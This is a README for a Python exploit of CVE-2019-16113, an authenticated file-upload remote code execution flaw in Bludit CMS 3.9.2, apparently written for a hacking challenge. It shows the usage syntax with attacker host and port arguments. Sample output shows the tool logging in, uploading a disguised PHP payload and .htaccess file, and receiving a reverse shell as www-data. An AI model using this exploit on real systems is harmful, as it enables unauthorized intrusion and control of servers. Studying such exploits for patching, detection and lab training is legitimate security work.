# CVE-2019-16113 Bludit CMS - (Authenticated) Remote Code Execution 

## Summary

CVE-2019-16113 - Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.
Note I used the metasploit module as reference when wrote this python exploit.

## Usage

Run command without arguments for usage menu.

```sh
⬢  CVE-2019-16113_bludit_cms_upload_rce  master ⦿ ./bludit_cms_rce.py 
▀█████████▄   ▄█       ███    █▄  ████████▄   ▄█      ███     
  ███    ███ ███       ███    ███ ███   ▀███ ███  ▀█████████▄ 
  ███    ███ ███       ███    ███ ███    ███ ███▌    ▀███▀▀██ 
 ▄███▄▄▄██▀  ███       ███    ███ ███    ███ ███▌     ███   ▀ 
▀▀███▀▀▀██▄  ███       ███    ███ ███    ███ ███▌     ███     
  ███    ██▄ ███       ███    ███ ███    ███ ███      ███     
  ███    ███ ███▌    ▄ ███    ███ ███   ▄███ ███      ███     
▄█████████▀  █████▄▄██ ████████▀  ████████▀  █▀      ▄████▀   
             ▀                                                
CVE-2019-16113 - [nighter@nighter.se]                                                              
        
Usage: ./bludit_cms_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>
EXAMPLE: ./bludit_cms_rce.py 'http://10.10.10.XX' 10.10.14.24 4444 <USERNAME> <PASSWORD>


```

Run with arguments to get a proper shell. Output is censored to not spoil a hacking challenge where this script was written for.

```sh
⬢  CVE-2019-16113_bludit_cms_upload_rce  master ⦿ ./bludit_cms_rce.py http://10.10.10.XX 10.10.14.XXX 4444 username password
[+] Netcat: 4444
[+] Login successful
[+] Upload payload.png successful!
[+] Upload .htaccess successful
[+] Execute payload
Connection from 10.10.10.XXX:54162
Linux hostname 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:24:11 up  1:48,  1 user,  load average: 0.00, 0.05, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shaun    :0       :0               11:36   ?xdm?   2:05   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```